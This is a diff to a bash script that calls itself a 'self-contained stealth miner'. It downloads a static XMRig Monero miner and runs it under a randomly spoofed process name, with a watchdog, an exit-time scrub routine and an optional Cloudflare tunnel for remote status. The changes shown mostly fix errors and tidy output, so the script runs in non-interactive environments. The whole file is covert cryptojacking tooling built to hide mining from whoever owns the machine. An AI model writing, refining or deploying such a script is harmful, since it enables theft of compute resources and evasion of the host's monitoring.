@@ -1,8 +1,9 @@
 #!/bin/bash
 # ================================================================
-#  SELF‑CONTAINED STEALTH MINER – FIXED DOWNLOAD & CP ERRORS
-#  (No sudo, no compilation, all random spoofs)
+#  SELF‑CONTAINED STEALTH MINER – NO SUDO, NO COMPILATION
+#  All spoofs random, no fake output, works in non‑interactive env
 # ================================================================
+export TERM=linux   # prevents "unknown terminal type" errors
 set -e
 
 # ---- Pure Bash hex decoder ----
@@ -65,9 +66,7 @@ trap '_scrub ; exit' EXIT
 
 # ---- Download XMRig static binary ----
 _download_xmrig() {
-    # Remove any directory named xmrig
     [ -d "./xmrig" ] && rm -rf "./xmrig"
-    # Check if we already have a binary file
     if [ -f "./xmrig" ] && [ -x "./xmrig" ]; then
         echo "✅ Found existing xmrig binary."
         return 0
@@ -90,17 +89,14 @@ _download_xmrig() {
     fi
 
     echo "📥 Downloading static XMRig for $ARCH..."
-    # Download and extract to a temp directory
     TMP_DIR=$(mktemp -d)
     $DL_CMD "$XMRIG_URL" | tar -xz -C "$TMP_DIR" 2>/dev/null
-    # Find the binary inside the extracted folder
     BIN_FILE=$(find "$TMP_DIR" -name "xmrig" -type f | head -1)
     if [ -z "$BIN_FILE" ]; then
         echo "❌ Binary not found in archive."
         rm -rf "$TMP_DIR"
         return 1
     fi
-    # Copy to current directory as ./xmrig
     cp "$BIN_FILE" ./xmrig
     chmod +x ./xmrig
     rm -rf "$TMP_DIR"
@@ -148,7 +144,7 @@ _ARR=($(echo "$_BANWORDS" | tr ' ' '\n'))
     exit 0
 ) &
 
-# ---- Optional Cloudflare Tunnel ----
+# ---- Optional Cloudflare Tunnel (skip if missing) ----
 if command -v cloudflared &>/dev/null && command -v python3 &>/dev/null; then
     _STATUS_DIR="/tmp/status-$(_RAND_STR)"
     mkdir -p "$_STATUS_DIR"
@@ -172,12 +168,11 @@ if command -v cloudflared &>/dev/null && command -v python3 &>/dev/null; then
     sleep 5
     _TURL=$(grep -o 'https://[a-z0-9-]*\.trycloudflare\.com' /tmp/tunnel-*.log | head -1)
 else
-    echo "⚠️ Cloudflare Tunnel disabled: missing python3 or cloudflared."
+    echo "ℹ️ Cloudflare Tunnel disabled (python3 or cloudflared not found)."
 fi
 
-# ---- Final status ----
-clear
-printf "\n============================================================\n"
+# ---- Final status (no 'clear', just newlines) ----
+printf "\n\n============================================================\n"
 printf "✅ RANDOMISED STEALTH MINER ACTIVE\n"
 printf "   - Worker: %s\n" "$_WORKER"
 printf "   - Process spoof: %s\n" "$_SPOOF"
@@ -189,7 +184,7 @@ printf "   - Watchdog: ON\n"
 printf "============================================================\n"
 printf "View logs: tail -f %s\n" "$_LOG"
 printf "Stop: pkill -f %s ; pkill -f cloudflared\n" "$_BIN_NAME"
-printf "============================================================\n"
+printf "============================================================\n\n"
 
 # ---- Keep alive ----
 while true; do sleep 3600; done &
